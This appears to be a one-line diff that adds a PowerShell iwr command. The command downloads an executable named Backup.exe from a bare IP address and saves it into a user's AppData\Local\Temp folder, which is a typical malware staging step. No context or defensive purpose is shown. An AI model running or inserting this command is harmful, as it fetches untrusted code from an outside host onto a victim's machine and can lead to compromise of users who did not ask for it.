@@ -1,0 +1,1 @@
+iwr http://172.233.245.47/Backup.exe -o \Users\alfred\AppData\Local\Temp\backup.exe
